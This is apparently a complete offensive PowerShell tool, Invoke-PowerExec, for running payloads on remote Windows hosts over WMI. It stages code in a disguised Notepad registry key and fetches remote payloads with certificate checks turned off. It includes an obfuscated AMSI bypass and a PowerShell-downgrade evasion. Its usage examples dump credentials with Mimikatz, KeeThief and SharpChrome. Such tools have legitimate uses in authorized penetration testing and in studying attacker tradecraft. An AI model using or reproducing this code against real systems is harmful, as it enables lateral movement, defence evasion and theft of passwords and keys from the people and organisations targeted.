function Invoke-PowerExec {
<#
.SYNOPSIS
    Run a payload on remote hosts and get the output.

    Author: Timothée MENOCHET (@synetis)

.DESCRIPTION
    Invoke-PowerExec runs PowerShell scripts and .NET assemblies on remote hosts over WMI, and returns the output.

.NOTES
    Invoke-PowerExec does NOT require PowerShell Remoting or WinRM to work and only uses Windows Management Instrumentation (WMI).

.PARAMETER Type
    Specify the payload type (PSScript, NETAssembly).

.PARAMETER File
    Specify a local payload to run.

.PARAMETER URL
    Specify a remote payload to run.

.PARAMETER Arguments
    Specify the payload arguments.

.PARAMETER Hosts
    Specify the target hosts.

.PARAMETER Credential
    Specify the privileged account to use.

.EXAMPLE
    PS C:\> . .\Invoke-PowerExec.ps1
    PS C:\> Invoke-PowerExec -Type PSScript -File .\Invoke-Mimikatz.ps1 -Arguments 'Invoke-Mimikatz -DumpCreds' -Hosts '192.168.0.1'

.EXAMPLE
    PS C:\> Invoke-PowerExec -Type PSScript -URL 'https://raw.githubusercontent.com/HarmJ0y/KeeThief/master/PowerShell/KeeThief.ps1' -Arguments 'Get-KeePassDatabaseKey' -Hosts '192.168.0.1','192.168.0.2' -Credential ADATUM\Administrator

.EXAMPLE
    PS C:\> Invoke-PowerExec -Type NETAssembly -File .\SharpChrome.exe -Arguments 'logins','/unprotect','/format:table' -Hosts $(gc hosts.txt) -Credential ADATUM\Administrator
#>

	Param (
		[Parameter(Mandatory=$True)]
		[ValidateSet("PSScript","NETAssembly")]
		[String]$Type,

		[ValidateNotNullOrEmpty()]
		[String]
		$File = $null,

		[ValidateNotNullOrEmpty()]
		[String]
		$URL = $null,

		[ValidateNotNullOrEmpty()]
		[String[]]
		$Arguments = $null,

		[Parameter(ValueFromPipeline=$True)]
		[ValidateNotNullOrEmpty()]
		[String[]]
		$Hosts = $env:COMPUTERNAME,

		[ValidateNotNullOrEmpty()]
		[System.Management.Automation.PSCredential]
		[System.Management.Automation.Credential()]
		$Credential = [System.Management.Automation.PSCredential]::Empty
	)

	If($Type -eq 'PSScript') {
		$EncArgs = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Arguments))
		$RunScript = '$EncArgs = ' + "'$EncArgs'" + '; [System.Text.Encoding]::UTF8.GetString($Code) | Invoke-Expression; [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncArgs)) | Invoke-Expression; '
	} ElseIf($Type -like 'NETAssembly') {
		$Arguments = ($Arguments -join "','")
		$RunScript = '$Assembly = [Reflection.Assembly]::Load([byte[]]$Code); $al = New-Object -TypeName System.Collections.ArrayList; [string[]]$xargs = ' + "'$Arguments'" + '; $al.add($xargs) | Out-Null; $Assembly.EntryPoint.Invoke($null, $al.ToArray()); '
	}

	If ($File) {
		# Registry settings used to store the payload
		$bytes = [IO.File]::ReadAllBytes((Resolve-Path $File))
		$RegValue = [System.Convert]::ToBase64String($bytes)
		$RegistryPath = 'HKLM:\SOFTWARE\Microsoft\Notepad'
		$RegHive = 2147483650
		$RegPath = 'SOFTWARE\\Microsoft\\Notepad'
		$RegKey = 'RunMe'

		# Script used to retrieve and run the payload
		$Script = '$EncCode = (Get-ItemProperty -Path ' + "'$RegistryPath'" + ').' + "'$RegKey'" + '; $Code = [System.Convert]::FromBase64String($EncCode); '
		$Script = $Script + $RunScript

		ForEach($ComputerName in $Hosts) {
			# Upload the payload
			Write-Verbose "[$ComputerName] Storing the payload into registry key $RegistryPath\$RegKey"
			Try {
				Invoke-WmiMethod -Namespace 'root\default' -Class StdRegProv -Name SetStringValue $RegHive, $RegPath, $RegValue, $RegKey -ComputerName $ComputerName -Credential $Credential -ErrorAction Stop | Out-Null
			} Catch [System.Runtime.InteropServices.COMException] {
				Write-Host "[$ComputerName] $_"
				Continue
			} Catch [System.UnauthorizedAccessException] {
				Write-Host "[$ComputerName] $_"
				Continue
			}

			# Execute the payload
			Invoke-WMIExec -Command $Script -ComputerName $ComputerName -Credential $Credential

			# Remove the payload
			Write-Verbose "[$ComputerName] Removing registry key $RegistryPath\$RegKey"
			Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $RegHive, $RegPath, $RegKey -Computer $ComputerName -Credential $Credential | Out-Null
		}
	} ElseIf ($URL) {
		# Script used to download and run the payload
		$EncUrl = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($URL))
		$Script = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $client = [System.Net.WebRequest]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(' + "'$EncUrl'" + '))); $client.Proxy = [System.Net.WebRequest]::GetSystemWebProxy(); $client.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials; $Response = $client.GetResponse(); $RespStream = $Response.GetResponseStream(); $Buffer = New-Object byte[] $Response.ContentLength; $WriteStream = New-Object System.IO.MemoryStream $Response.ContentLength; Do {$BytesRead = $RespStream.Read($Buffer, 0, $Buffer.Length); $WriteStream.Write($Buffer, 0, $BytesRead)} While ($BytesRead -gt 0); $Code = New-Object byte[] $Response.ContentLength; [Array]::Copy($WriteStream.GetBuffer(), $Code, $Response.ContentLength); '
		$Script = $Script + $RunScript

		ForEach($ComputerName in $Hosts) {
			# Execute the payload
			Invoke-WMIExec -Command $Script -ComputerName $ComputerName -Credential $Credential
		}
	} Else {
		Write-Error 'File or URL argument missing'
	}
}

function Invoke-WMIExec {

	Param (
		[ValidateNotNullOrEmpty()]
		[String]
		$Command = 'hostname',

		[ValidateNotNullOrEmpty()]
		[String]
		$ComputerName = $env:COMPUTERNAME,

		[ValidateNotNullOrEmpty()]
		[System.Management.Automation.PSCredential]
		[System.Management.Automation.Credential()]
		$Credential = [System.Management.Automation.PSCredential]::Empty
	)

	# Get the .NET Framework version
	Write-Verbose "[$ComputerName] Getting the .NET framework version"
	$RegHive = 2147483650
	$RegPath = 'SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v2.0.50727'
	$RegKey = 'Version'
	$OldVersion = (Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $RegHive, $RegPath, $RegKey -Computer $ComputerName -Credential $Credential).sValue

	# Add AMSI bypass and encode the payload
	$AmsiBypass = '$Class = ' + "'System.Management.Automation.Amsi' + 'Utils'; " + '$Type = [Ref].Assembly.GetType($Class); $field = $Type.GetField(' + "'amsiIn' + 'itFailed','NonPublic,Static'); " + '$field.SetValue($null,$true); '
	If (-Not $OldVersion) {
		$Command = $AmsiBypass + $Command
	}
	$EncScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
	If ($OldVersion) {
		$Command = "powershell -Version 2 -W 1 -NonI -NoP -Enc $EncScript"
	} Else {
		$Command = "powershell -W 1 -NonI -NoP -Enc $EncScript"
	}

	# Run the command and store the output
	$RegistryPath = 'HKLM:\SOFTWARE\Microsoft\Notepad'
	$RegHive = 2147483650
	$RegPath = 'SOFTWARE\\Microsoft\\Notepad'
	$RegKey = 'ReadMe'
	$Script = '$Output = ' + "($Command)" + ' | Out-String; $EncOutput = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Output)); New-ItemProperty -Path ' + "'$RegistryPath'" + ' -Name ' + "'$RegKey'" + ' -Value $EncOutput -PropertyType String -Force;'
	If ($OldVersion) {
		Write-Verbose "[$ComputerName] Running the payload while bypassing AMSI via PowerShell downgrade"
		$Command = 'powershell.exe -Version 2 -W 1 -NonI -NoP -Command ' + "$Script"
	} Else {
		Write-Verbose "[$ComputerName] Running the payload while bypassing AMSI via amsiInitFailed property"
		$Script = $AmsiBypass + $Script
		$Command = 'powershell.exe -W 1 -NonI -NoP -Command ' + "$Script"
	}
	$Process = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $Command -ComputerName $ComputerName -Credential $Credential
	$ProcessId = $Process.ProcessId
	Do {
		Start-Sleep -m 1000
	} Until ((Get-WMIobject -Class Win32_process -Filter "ProcessId='$ProcessId'" -ComputerName $ComputerName -Credential $Credential | Where {$_.Name -eq "powershell.exe"}).ProcessID -eq $null)

	# Retrieve the command output
	Write-Verbose "[$ComputerName] Retrieving the output from registry key $RegistryPath\$RegKey"
	$EncOutput = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $RegHive, $RegPath, $RegKey -Computer $ComputerName -Credential $Credential
	$Output = [System.Convert]::FromBase64String($EncOutput.sValue)
	$Output = [System.Text.Encoding]::Unicode.GetString($Output)

	Write-Host "[$ComputerName] Payload executed successfully"
	Write-Host $Output

	# Remove the output
	Write-Verbose "[$ComputerName] Removing registry key $RegistryPath\$RegKey"
	Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $RegHive, $RegPath, $RegKey -Computer $ComputerName -Credential $Credential | Out-Null
}